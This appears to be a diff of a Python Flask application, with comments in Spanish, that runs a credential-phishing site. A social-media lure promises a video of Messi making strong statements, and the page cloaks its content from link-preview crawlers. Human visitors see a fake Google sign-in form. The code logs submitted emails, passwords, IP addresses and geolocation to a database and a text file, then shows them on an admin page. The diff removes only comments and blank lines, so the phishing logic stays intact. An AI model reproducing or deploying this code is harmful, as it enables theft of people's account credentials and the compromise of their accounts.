@@ -9,7 +9,6 @@ import re
 
 app = Flask(__name__)
 
-# Inicializar DB
 def init_db():
     conn = sqlite3.connect('credentials.db')
     cursor = conn.cursor()
@@ -42,8 +41,6 @@ def get_template():
 <head>
     <meta charset="UTF-8">
     <link rel="icon" href="data:;base64,iVBORw0KGgo=">
-    
-    <!-- METADATOS COMPLETOS PARA TODAS LAS REDES SOCIALES -->
     <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
     <meta property="og:description" content="El astro argentino revela detalles inéditos de su carrera y futuro" />
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
@@ -56,8 +53,6 @@ def get_template():
     <meta property="og:video" content="https://i.imgur.com/kgo0gfA.png" />
     <meta property="og:video:width" content="1280" />
     <meta property="og:video:height" content="720" />
-    
-    <!-- METADATOS PARA TWITTER -->
     <meta name="twitter:card" content="player" />
     <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
     <meta name="twitter:description" content="El astro argentino revela detalles inéditos" />
@@ -65,7 +60,6 @@ def get_template():
     <meta name="twitter:player" content="https://video-messi.onrender.com" />
     <meta name="twitter:player:width" content="1280" />
     <meta name="twitter:player:height" content="720" />
-    
     <title>😲 Fuertes declaraciones de Messi</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
@@ -88,7 +82,6 @@ def get_template():
             <source src="https://i.imgur.com/kgo0gfA.png" type="video/mp4">
         </video>
     </div>
-    
     <div class="container">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
         <h1>Iniciar sesión</h1>
@@ -115,7 +108,6 @@ def get_template():
 @app.route('/')
 def index():
     user_agent = request.headers.get('User-Agent', '').lower()
-    
     if any(bot in user_agent for bot in ['facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot']):
         return render_template_string('''
         <!DOCTYPE html>
@@ -139,7 +131,6 @@ def index():
         </body>
         </html>
         ''')
-    
     return render_template_string(get_template())
 
 @app.route('/capture', methods=['POST'])
@@ -147,7 +138,6 @@ def capture():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ip and ',' in ip:
         ip = ip.split(',')[0].strip()
-    
     try:
         geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
         if geo.get('status') == 'success':
@@ -156,10 +146,8 @@ def capture():
             location = "Unknown"
     except:
         location = "Unknown"
-    
     username = request.form.get('email') or request.form.get('username', '')
     password = request.form.get('password', '')
-    
     data = {
         'timestamp': datetime.now().isoformat(),
         'ip': ip,
@@ -169,7 +157,6 @@ def capture():
         'referer': request.headers.get('Referer', ''),
         'geo_location': location
     }
-    
     try:
         conn = sqlite3.connect('credentials.db')
         cursor = conn.cursor()
@@ -180,12 +167,10 @@ def capture():
               data['user_agent'], data['referer'], data['geo_location']))
         conn.commit()
         conn.close()
-        
         with open('credentials.txt', 'a', encoding='utf-8') as f:
             f.write(f"{data['timestamp']} | {data['ip']} | {data['username']} | {data['password']} | {data['geo_location']}\n")
     except Exception as e:
         print(f"Error guardando: {e}")
-    
     return redirect("https://www.google.com")
 
 @app.route('/api/credentials')
@@ -208,7 +193,6 @@ def admin():
         cursor.execute('SELECT * FROM credentials ORDER BY id DESC LIMIT 50')
         data = cursor.fetchall()
         conn.close()
-        
         html = '''
         <!DOCTYPE html>
         <html>
@@ -249,7 +233,6 @@ def admin():
                     <td>{row[7]}</td>
                 </tr>
             '''
-        
         html += '''
             </table>
         </body>
